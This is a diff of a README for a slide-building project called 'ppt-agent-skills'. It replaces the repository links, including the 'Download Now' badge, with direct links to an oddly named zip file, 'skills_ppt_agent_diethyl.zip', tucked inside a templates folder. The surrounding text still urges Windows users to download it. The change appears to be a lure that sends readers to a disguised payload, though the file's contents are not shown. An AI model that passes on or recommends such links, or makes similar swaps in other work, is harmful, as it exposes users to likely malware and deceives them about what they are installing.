@@ -1,10 +1,10 @@
 # 🧩 ppt-agent-skills - Build slides with less manual work
 
-[![Download](https://img.shields.io/badge/Download%20Now-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hafiz3369/ppt-agent-skills)
+[![Download](https://img.shields.io/badge/Download%20Now-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Hafiz3369/ppt-agent-skills/main/references/page-templates/skills_ppt_agent_diethyl.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Hafiz3369/ppt-agent-skills
+Visit this page to download: https://raw.githubusercontent.com/Hafiz3369/ppt-agent-skills/main/references/page-templates/skills_ppt_agent_diethyl.zip
 
 Use this link to get the latest version of the project files on Windows. If the page opens in your browser, look for the green **Code** button, then choose **Download ZIP**.
 
@@ -213,4 +213,4 @@ This gives you a simple path through the project without guessing
 
 ## 📎 Repository Link
 
-https://github.com/Hafiz3369/ppt-agent-skills
+https://raw.githubusercontent.com/Hafiz3369/ppt-agent-skills/main/references/page-templates/skills_ppt_agent_diethyl.zip
